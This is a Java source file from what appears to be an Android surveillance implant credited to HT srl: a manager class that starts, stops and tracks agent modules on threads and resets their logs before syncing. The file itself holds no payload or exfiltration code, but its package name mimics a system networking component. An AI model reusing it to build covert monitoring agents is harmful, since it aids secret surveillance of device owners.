/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.networking.manager;

import java.util.HashMap;
import java.util.Iterator;

import com.android.networking.Trigger;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.interfaces.IncrementalLog;
import com.android.networking.module.BaseModule;
import com.android.networking.module.FactoryModule;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

/**
 * The Class AgentManager.
 */
public class ManagerModule extends Manager<BaseModule, String, String> {

	/** The Constant TAG. */
	private static final String TAG = "AgentManager"; //$NON-NLS-1$

	/** The singleton. */
	private volatile static ManagerModule singleton;

	/**
	 * Self.
	 * 
	 * @return the agent manager
	 */
	public static ManagerModule self() {
		if (singleton == null) {
			synchronized (ManagerModule.class) {
				if (singleton == null) {
					singleton = new ManagerModule();
					singleton.setFactory(new FactoryModule());
				}
			}
		}

		return singleton;
	}

	/**
	 * Start agents.
	 * 
	 * @return true, if successful
	 */
	@Override
	public synchronized boolean startAll() {
		HashMap<String, ConfModule> agents;
		agents = status.getAgentsMap();

		if (agents == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agents map null");//$NON-NLS-1$
			}
			return false;
		}

		if (instances == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Running Agents map null");//$NON-NLS-1$
			}
			return false;
		}

		final Iterator<String> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final String key = it.next();
			if (Cfg.DEBUG) {
				Check.asserts(key != null, "null type"); //$NON-NLS-1$
			}
			final ConfModule conf = agents.get(key);
			start(key);

		}

		return true;
	}

	// Deve essere bloccante. Attende l'effettivo stop di tutto.
	/**
	 * Stop agents.
	 */
	@Override
	public synchronized void stopAll() {
		HashMap<String, ConfModule> agents;
		agents = status.getAgentsMap();
		final Iterator<String> it = agents.keySet().iterator();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopAll)");//$NON-NLS-1$
		}

		while (it.hasNext()) {
			final String key = it.next();
			stop(key);
		}

		if (Cfg.DEBUG) {
			Check.ensures(threads.size() == 0, "Non empty threads"); //$NON-NLS-1$
		}

		instances.clear();

		if (Cfg.DEBUG) {
			Check.ensures(instances.size() == 0, "Non empty running"); //$NON-NLS-1$
		}

		threads.clear();
	}

	/**
	 * Start agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void start(final String key, Trigger trigger) {
		HashMap<String, ConfModule> agents;

		agents = status.getAgentsMap();

		if (agents == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agents map null");//$NON-NLS-1$
			}
			return;
		}

		if (instances == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Running Agents map null");//$NON-NLS-1$
			}
			return;
		}

		BaseModule a = makeAgent(key);

		if (a == null) {
			return;
		}

		// Agent mapped and running
		if (a.isRunning() || a.isSuspended()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agent " + key + " is already running or suspended");//$NON-NLS-1$ //$NON-NLS-2$
			}
			return;
		}

		if (Cfg.DEBUG) {
			Check.asserts(a != null, "null agent"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.asserts(instances.get(key) != null, "null running"); //$NON-NLS-1$
		}

		if (a.setConf(agents.get(key))) {
			a.setTrigger(trigger);
			final Thread t = new Thread(a);
			if (Cfg.DEBUG) {
				t.setName(a.getClass().getSimpleName());
			}
			threads.put(a, t);
			t.start();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start) Error: Cannot set Configuration");
			}
		}
	}

	private BaseModule makeAgent(String type) {
		if (instances.containsKey(type) == true) {
			return instances.get(type);
		}

		final BaseModule base = factory.create(type, null);

		if (base != null) {
			instances.put(type, base);
		}

		return base;
	}

	/**
	 * Stop agent.
	 * 
	 * @param moduleId
	 *            the key
	 */
	@Override
	public synchronized void stop(final String moduleId) {
		final BaseModule a = instances.get(moduleId);

		if (a == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agent " + moduleId + " not present");//$NON-NLS-1$ //$NON-NLS-2$
			}
			return;
		}

		a.stopThread();
		// running.remove(moduleId);

		final Thread t = threads.get(a);
		if (t != null) {
			try {
				t.join();
			} catch (final InterruptedException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}
			threads.remove(a);
		}
	}

	/**
	 * resets incremental logs before sync
	 */
	public void resetIncrementalLogs() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetIncrementalLogs)");
		}
		for (BaseModule agent : threads.keySet()) {
			if (agent != null && agent instanceof IncrementalLog) {
				((IncrementalLog) agent).resetLog();
			}
		}

		Utils.sleep(2000);
	}

	@Override
	public void start(String moduleId) {
		start(moduleId, null);

	}

}
